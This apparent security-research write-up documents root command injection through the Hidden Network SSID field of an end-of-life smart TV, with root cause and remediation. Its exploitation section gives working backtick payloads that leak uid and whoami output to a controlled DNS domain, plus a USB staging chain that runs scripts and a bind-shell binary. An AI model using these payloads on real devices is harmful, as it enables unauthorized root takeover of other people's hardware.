# Initial access: command injection via the WiFi SSID field

This is the flagship finding and the vector used to gain first code execution on
the device. It is written up here in responsible-disclosure style. The affected
platform is end-of-life and no longer receives vendor firmware updates.

## Summary

The VIA UI's **"Hidden Network"** flow, which lets the user type an SSID
manually, passes that SSID string toward a shell without sanitization. An SSID
containing a backtick-wrapped command therefore causes that command to execute —
as **root** — during the connection attempt.

- **Class:** OS command injection (CWE-78) via an untrusted network-configuration
  field.
- **Privilege:** root (uid 0), because the network stack runs as root.
- **Access required:** local UI interaction to enter the hidden-network SSID.
- **Authentication required:** none beyond physical/UI access to the TV.

## Why "Hidden Network" specifically

Passive WiFi scanning does **not** trigger the vulnerable path — scanned SSIDs
from the air are stored by `wpa_supplicant` as data and never reach a shell. The
injection is in the **manual entry** path: when the user opens *Menu → Network →
Hidden Network* and types an SSID, the VIA UI hands that value to a component
that composes a shell command line with it. That distinction matters both for
understanding the bug and for scoping its reachability: it is a local-input bug,
not a remote "broadcast a malicious SSID and own nearby TVs" bug.

## Mechanism

1. The user enters an SSID in the Hidden-Network dialog.
2. The value flows into network/MAC configuration handling (a
   `*_write_mac_config*`-style routine in the network-info library is the
   suspected sink) and, downstream, into a shell invocation.
3. No escaping or allow-listing is applied to the SSID string.
4. Backtick (`` `…` ``) or `$( … )` content in the SSID is evaluated by the
   shell, executing as root.

The SSID field is length-limited (on the order of ~32 bytes total), which
constrains the payload but is more than enough to bootstrap a larger stage — for
example, executing a short command that reads a second stage from attached USB
storage, which the device auto-mounts.

## Impact

Root command execution from a value the product invites the user to type. Once
root is obtained, the platform offers no barrier to persistence (see
[persistence](05-persistence.md)) and no privilege boundary to cross — every
relevant process already runs as root, and `/dev/mem` is open.

## Root cause and remediation (for platforms of this class)

- **Root cause:** building a shell command line by string-concatenating an
  untrusted configuration field.
- **Fix:** never pass user-supplied network fields through a shell. Use
  `exec`-style APIs with an argument vector, or strictly allow-list the SSID
  character set (SSIDs are octet strings, but the *product's* handling should
  reject shell metacharacters). Treat every field the UI collects as untrusted
  input to be validated at the boundary.

## Exploitation in practice

The following sections describe how the injection was verified and bootstrapped
on the target hardware. Commands are shown with generic placeholders for
environment-specific values.

### Blind execution: the DNS oracle

The device has no interactive shell — there is no terminal output visible to the
user after entering the SSID. Confirming execution therefore requires an
**out-of-band signal**. The approach used here is a DNS oracle: inject a payload
that causes the TV to issue a DNS query for a unique label under a domain whose
authoritative nameserver you control. The query appears in the server's log,
confirming the command ran.

**Step 1 — basic connectivity test:**

Navigate to *Menu → Network → Hidden Network*. In the SSID field, type:

```
`ping <LABEL>.<DNS_ORACLE_DOMAIN>`
```

Where `<LABEL>` is a unique tag (e.g. `t1`) and `<DNS_ORACLE_DOMAIN>` is a
domain whose DNS you monitor. After pressing CONNECT, watch the authoritative
nameserver's query log. A DNS lookup for `<LABEL>.<DNS_ORACLE_DOMAIN>` confirms
code execution.

**Step 2 — confirm uid:**

```
`ping u$(id -u).<DNS_ORACLE_DOMAIN>`
```

A DNS query for `u0.<DNS_ORACLE_DOMAIN>` confirms the injection runs as root
(uid 0).

**Step 3 — enumerate the shell environment:**

```
`ping $(whoami).<DNS_ORACLE_DOMAIN>`
```

### Field constraints

The SSID input field imposes hard limits that shape what payloads are possible:

| Property | Observation |
|----------|-------------|
| Maximum length | ~32 characters (hard cap enforced by the UI) |
| Backticks (`` ` ``) | **Work** — primary injection vehicle |
| `$( )` subshell | **Works** — alternative to backticks |
| Pipe (`\|`) | Works |
| Redirect (`>`, `<`) | Work |
| Hyphen, underscore, dot (`-`, `_`, `.`) | Work |
| Semicolon (`;`) | **Rejected** by the UI validator |
| Ampersand (`&`) | **Rejected** by the UI validator |

The semicolon and ampersand rejections mean command chaining within a single
SSID entry is not directly possible. Each payload is a single command,
constrained to ~32 bytes including the backtick delimiters. This is tight but
sufficient to bootstrap a second stage (see [USB second-stage](#usb-second-stage-bootstrapping)
below).

### Shell identification

The shell executing the injection is **hush** (the BusyBox built-in shell,
pre-1.20 variant). Key behaviors:

- `$()` substitution works but `$()` **piped** constructs are broken
  (e.g. `$(cat /etc/passwd | head -1)` fails silently).
- No `/dev/tcp` pseudo-device (rules out bash-style reverse shells).
- No `bash`, `sh` is a symlink to `busybox`.
- Backtick substitution is the most reliable injection form.

### BusyBox applet inventory

BusyBox on this device is minimal. The following were confirmed present or
absent via the DNS oracle:

| Applet | Present | Notes |
|--------|---------|-------|
| `ping` | Yes | Used for the DNS oracle |
| `cat` | Yes | File reads |
| `ls` | Yes | Directory listing |
| `cp` | Yes | File copy |
| `mv` | Yes | File move |
| `chmod` | Yes | Permission changes |
| `id` | Yes | UID confirmation |
| `sh` | Yes | Symlink to BusyBox hush |
| `busybox` | Yes | Multi-call binary |
| `wget` | **No** | Not compiled in |
| `nc` / `netcat` | **No** | Not compiled in |
| `tftp` | **No** | Not compiled in |
| `httpd` | **No** | Not compiled in |
| `telnetd` | **No** | Not compiled in (inetd ships it separately) |
| `bash` | **No** | Not present on the system |
| `curl` | **No** | Not present on the system |

The absence of `wget`, `nc`, `curl`, and `tftp` means the device cannot
directly download a second stage over the network from within a 32-byte
SSID payload. This is why USB staging is the practical bootstrap path.

### USB second-stage bootstrapping

The TV auto-mounts FAT32-formatted USB drives at `/tmp/mnt/usb/sda1` when
inserted. This auto-mount, combined with the SSID injection, provides a
two-step bootstrap:

**Phase 1 — Verify write access to USB:**

1. Insert a FAT32-formatted USB stick into the TV.
2. In the Hidden Network SSID field, enter:

```
`id>/tmp/mnt/usb/sda1/o`
```

This is 23 characters — well within the 32-byte limit. After pressing CONNECT,
remove the USB stick and read the file `o` on a PC. It should contain:

```
uid=0(root) gid=0(root)
```

This confirms: (a) injection works, (b) the process is root, (c) the USB path
is correct, and (d) the shell can write to the USB mount.

**Phase 2 — Read from USB (execute a staged script):**

1. On a PC, write a shell script to the USB stick (e.g. `s.sh`) containing the
   commands you want to run. Keep it simple — the shell is hush, not bash.
2. Insert the USB stick into the TV.
3. In the SSID field, enter:

```
`sh /tmp/mnt/usb/sda1/s.sh`
```

This is 28 characters. The staged script has no length limit and can perform
arbitrary operations: enumerate the filesystem, dump configuration, copy
binaries to the USB for offline analysis, or establish persistence.

**Phase 3 — Stage and execute a static ARM binary (optional):**

For operations that require tools not available in BusyBox (e.g. a bind shell,
a proper `nc`, or a custom enumeration tool), cross-compile a **static ARMv7
ELF** binary on a workstation and place it on the USB stick. Then:

```
`cp /tmp/mnt/usb/sda1/t /tmp/t`
```

Followed by (as a separate SSID injection):

```
`chmod 755 /tmp/t;/tmp/t`
```

Note: the semicolon is rejected by the UI validator, so this must be done as
a staged script instead:

```
`sh /tmp/mnt/usb/sda1/r.sh`
```

Where `r.sh` contains:

```sh
cp /tmp/mnt/usb/sda1/t /tmp/t
chmod 755 /tmp/t
/tmp/t
```

`/tmp` is a tmpfs and will be cleared on reboot, so this is non-persistent
unless combined with the `/3rd_rw` persistence technique (see
[05-persistence.md](05-persistence.md)).

## Disclosure note

The subject device is a personally owned, ~2013, end-of-life TV that the vendor
no longer updates; there is no firmware patch to coordinate and no supported
fleet defended by one. The commands shown above were executed on the author's
own hardware on an isolated lab network. They are published to document the
vulnerability class and methodology at a level useful for security research and
defense — not as a toolkit for attacking devices the reader does not own.
